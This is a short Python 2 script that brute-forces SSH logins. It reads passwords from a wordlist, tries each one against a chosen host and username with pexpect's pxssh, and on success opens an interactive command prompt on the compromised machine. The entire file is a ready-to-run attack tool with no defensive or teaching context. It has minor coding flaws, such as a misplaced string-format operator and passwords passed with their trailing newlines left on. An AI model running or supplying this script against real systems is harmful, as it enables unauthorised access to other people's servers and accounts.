from pexpect import pxssh
from optparse import OptionParser
from termcolor import colored,cprint
parser=OptionParser()
parser.add_option("-w",dest="wordlist",help="Passfile directory",type="string")
parser.add_option("-t",dest="target",help="DNS or IP of a target",type="string")
parser.add_option("-l",dest="username",help="SSH username",type="string")
(opts,args)=parser.parse_args()
Found = False

if opts.wordlist is None or opts.target is None or opts.username is None:
    parser.error("syntax error -h for help")
def send_command(s,cmd):
    s.sendline(cmd)
    s.prompt()
    print s.before
def connect(host,user,password):
    print "Trying %s:%s:%s" %(host,user,password)
    try:
        global s
        global Found
        s=pxssh.pxssh()
        s.login(host,user,password)
        print (colored("%s:%s Success, connection estabilished","green",attrs=['bold']))  %(user,password)       
        Found=True
        return s
    except:
        pass
            
def brute(host,user,passfile):
    pF=open(passfile,'r')
    for line in pF.readlines():
        password=str(line)
        if Found is False:
             connect(host,user,password)           
        else:
            break
    return s    
passfile=opts.wordlist
host=opts.target
user=opts.username
brute(host,user,passfile)
while Found==True:
    try:
        cmd=raw_input(user+"@"+host+":~$ ")  
        try:
            send_command(s,cmd)
        except:
            print (colored("Exiting session... \n","red",attrs=['bold']))
            break       
    except (KeyboardInterrupt,SystemExit):
        raise
    except:
        print (colored("Error..","red"))


        
